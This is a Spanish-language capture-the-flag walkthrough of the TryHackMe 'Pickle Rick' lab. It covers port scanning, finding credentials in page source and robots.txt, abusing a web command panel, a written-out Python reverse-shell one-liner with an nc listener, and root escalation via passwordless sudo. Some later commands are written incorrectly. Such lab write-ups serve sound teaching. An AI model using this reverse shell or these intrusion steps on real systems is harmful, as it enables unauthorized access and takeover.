''' 
https://tryhackme.com/room/picklerick
# PICKEL RICK --> EASY
'''

' ' ' '
### --> ESCANEO                                         

Para comenzar con esta máquia una vez que la inciamos en TryHackMe utilizaremos
el ping con el objetivo de saber qué ttl nos resuelve esto mediante una traza ICMP:                                                

$ ping -c 1  10.10.209.28                                                    

Gracias a esto conocemos el sistema operativo                                
mediante el ttl.                                                            

### --> MAPEO DE PUERTOS:

Para comenzar con el scaneo de los puerto utilizo este script de nmap el cual
está optimizado para que sea lo suficientemente rápido y no perder tiempo:   

$ sudo nmap -sS --min-rate 5000 --open -n -Pn -vvv 10.10.209.28 -oG ScanPort 

Con el script anterior lo que hacemos es analizar de manera general todos los
puertos abiertos y después sacar los puertos abierto y poder escanearlos con 
el siguiente scritp de forma detallada.                                       

$ nmap -sC -sV -p22,80 10.10.209.28 -oN Ports                                
De esta forma con ambos scripts ya conseguimos lo que necesitamos acerca de  
los servicios que manejan cada puerto.                                       
De antemano vemos que devuelve un puerto 80, esto ya nos da la información    
que maneja un servidor web por lo que vamos a explorar dicha página web.     

Entrando a la página no encontramos nada importante en el frontend o interfaz
por lo tanto daremos ctrl+u para ver el código fuente por si encontramos algo
que sean indicios de algo. Analizando el código fuente vemos comentarizado
lo siguiente:                                                                
' ' ' '
Username: R1ckRul3s                                                          

Normalmente nombres así pueden ser potenciales usuarios para poder hacer el
ataque necesario. Pero no es todo, de esta misma forma podemos encontrar
contraseñas.
Como forma adicional podemos ver que existe un directorio por el que se manda
a llamar la imagen que esta en el inicio, nos dirijiremos mediante la url a
este directorio

--> http://10.10.209.28/assets/
De esta forma hacemos el movimiento de directorio, pero ya estando dentro nos
damos cuenta que no hay mas que imagenes pero sabemos que hay mas directorios
por lo tanto utilizaremos el enumeramiento de directorios con gobuster en mi
caso pero usa el de tu preferencia:

gobuster dir -u http://10.10.209.28/ -w /usr/share/wordlists/dirbuster/direct
ory-list-2.3-medium.txt -x php,txt,py,zip,html

Una vez termine vemos que existe un documento robots.txt, estos documentos
suelen tener información bastante sensible, por lo tanto siempre hay que
buscarlos pues nos serian de gran ayuda
Bien, ya entrando desde el link de la misma forma que con la carpet assets lo
hacemos pero poniendo /robots.txt y así nos dirigiremos a dicho archivo.
NOTA: el traversal se hace mediante la url de la página.

frase encontrada: Wubbalubbadubdub
Potencialmente puede ser la contraseña del usuario que encontramos

Como información adicional del gobuster encontramos 2 archivos .php pero uno
viene como login.php, por lo tanto abriremos primero eso de la misma forma
que abrimos los demás archivos. Una vez abierto los dos vemos que nos dirijen
al mismo login por lo tanto no haremos mas que intentar burlar este login.
Lo primero a intentar es utilizar credenciales por defecto como:             

admin = admin
user = pass
root = root

Entre otras contraseñas, pero al no coincidir con estas   
primers dos, lo mas recomendable es probar con lo que ya  
tenemos:                                                  
*Username: R1ckRul3s                                       
*Password: Wubbalubbadubdub                                
                                                                             
Utilizando estas credenciales vemos que nos da acceso a un panel de ejecucion
algunas veces nos pueden dar este tipo de paneles con una bash, pero primero 
hay que ver qué tipo de comandos ejecuta. Al buscar y probar comando de dife-
rente lenguajes, me di cuenta que es terminal de comandos, por lo tanto con
los siguientes comando averiguaremos quienes somos, donde estamos y que hay
donde yo estoy:                                                              

*$ pwd    --> en que directorio estamos
*$ whoami --> quien soy en el sistema
*$ ls     --> lista directorio actual

con el comando ls encontramos el archivo donde encontraremos una flag o
ingrediente, utilizamos varios comando, pero nos damos cuenta que no deja uti
lizar el comando cat y nano, por lo tanto usaremos strings, con esto logramos
ver el contenido del archivo, y asi ver el de los demas archivos y listo     
primera flag econtrada.                                                      
para una reverse shell buscaremos que haya python en cualquier version o en  
su defecto perl, ruby o php, asi podremos ejecutarla                         
para probar python usaremos un comando simple y veremos si nos da un output  
$ python3 -c "print('hello world')"                                          
                                                                             
y nos devuelve un output deseado, por lo tanto usaremos la siguiente reverse 

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.152.61",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

cambiamos la IP a nuestra IP de la vpn y ponemos un el puerto 1234 en escucha para
la reverse shell con el comando:

$ nc -lnvp 1234
NOTA: ejecutaremos primero la instruccion del puerto en escucha en nuestra terminal,
la reverseshell la actualizaremos con nuestra IP y esa se ejecuta directamente en la 
webshell que esta en el navegador.

De esta forma obtenemos acceso a la máquina desde nuestra terminal, mucho mas cómodo
ahora veremos con los mismos comandos quiénes somos, donde estamos y que hay donde estamos,
estamos situados exactamente en el mismo lugar que la webshell. Encontraremos la forma de
convertirnos en root, probaremos lo mas sencillo, cambiarnos a root para ver si mínimo
no tiene credenciales de autenticación:
$ sudo su
$ whoami

despues de la ejecucion de estos dos comando vemos que no necesitabamos credenciales para
poder hacernos root, hay hacemos path traversal a la carpeta /home de ahí nos dirigimos a 
la carpeta rick
$ cd /home
$ ls /rick

vemos que tiene un archivo con la segunda flag, la abrimos con strings y listo

$ cd rick ; xargs strings "second ingredients"

ahora nos dirigiremos al directorio raiz y nos moveremos hasta root y el mismo procedimiento
listamos
$ cd ../../root | xargs strings 3rd.txt

y listo, máquina resuelta.

Espero te haya gustado, es una máquina bastante sencilla, muy fácil para empezar de 0 y 
conocer acerca de explotacion y busqueda de vulnerabilidades, cualquier duda
mandar mensaje directo por discord, espero haberte enseñado algo nuevo c:

Discord: MrGh057#4905
